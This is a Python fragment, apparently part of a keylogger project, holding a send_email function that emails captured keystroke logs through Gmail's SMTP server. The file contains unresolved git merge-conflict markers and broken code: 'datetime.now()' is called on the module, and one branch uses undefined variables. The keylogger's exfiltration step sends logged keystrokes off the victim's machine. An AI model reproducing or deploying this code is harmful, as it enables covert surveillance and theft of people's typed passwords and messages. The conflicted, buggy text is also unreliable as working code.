import datetime
import smtplib
from email.mime.text import MIMEText

<<<<<<< HEAD
# Generate a unique log file name based on the current date and time
LOG_FILE = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H:%M:%S')}.txt"

def send_email():
    sender_email = "your_email@example.com"
    receiver_email = "receiver_email@example.com"
    password = "your_email_password"

    # Read the log file
    with open(LOG_FILE, "r") as log_file:
        log_content = log_file.read()

    # Create an email message
    message = MIMEText(log_content)
    message["Subject"] = "Keylogger Logs"
    message["From"] = sender_email
    message["To"] = receiver_email
=======
def send_email(email, password, content):
    # Create an email message
    message = MIMEText(content)
    message["Subject"] = 'keylog.txt'
    message["From"] = email
    message["To"] = email
>>>>>>> de5a6c2 (made serious changes)

    try:
        # Connect to the SMTP server and send the email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:  # Change for non-Gmail providers
            server.starttls()
            server.login(email, password)
            server.send_message(message)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")